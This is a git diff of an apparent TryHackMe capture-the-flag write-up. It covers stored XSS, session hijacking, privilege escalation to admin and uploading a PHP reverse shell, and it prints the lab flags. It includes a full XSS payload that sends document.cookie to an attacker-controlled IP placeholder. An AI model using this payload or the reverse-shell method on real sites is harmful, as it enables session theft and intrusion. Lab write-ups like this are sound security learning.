@@ -86,7 +86,12 @@ I thought ill use XSS via contact.php - in reason of nmap scan and "PHPSESSID: h
 Vulnerability: Stored Cross-Site Scripting (XSS).  
 Payload used: <script>new Image().src='http://<myip>>?c=' + document.cookie;</script>  
 Method: Intercepted the PHPSESSID via a local listener and replaced the browser cookie to hijack the active session of the mod user.
-**THM{M0dH@ck3dPawned007}**
+
+<details>
+  <summary>🚩 Click to see Mod Flag</summary>
+  
+  `THM{M0dH@ck3dPawned007}`
+</details>
 
 ## 4. Privilege Escalation
 As mod we can continue checking out website. We can see settings, in which we can change password, and a place to promote user to an admin. Quick recon with burp - both of them need CSRF token. We can change our own password, we can't promote ourselfs to admin role.  
@@ -115,13 +120,18 @@ Accept-Encoding: gzip, deflate
 Im kinda sure it wasn't supposed to go this way, it had to do something with CSRF (didn't check if I could figure out a process of creating it), but it worked.
 **THM{Adm1NPawned007}**
 <details>
-  <summary>🚩 Click to see User Flag</summary>
+  <summary>🚩 Click to see Admin Flag</summary>
   
   `THM{Adm1NPawned007}`
 </details>
-### User Flag
-
-
+Now, as we are an admin, we have an access to new features hidden in main dashboard. It goes for lottery one, but it seems that one is down. So, we intercept new feature request and modify it to go for finance.php (the one we found in mail dumb)
+![alt text](image.png)
+And we do get an access to uploads. Lets craft a reverse shell in php.
+![alt text](image-1.png)
+Thats the uploaded path for it. We will runn it the same like we did with finance.php - using feature tab and modyfing the request.
+We do have a shell, lets upgrade it! https://0xffsec.com/handbook/shells/full-tty/
+![alt text](image-2.png)
+DOcker kurwa
 ### Root Flag (System / Administrator)
 
 
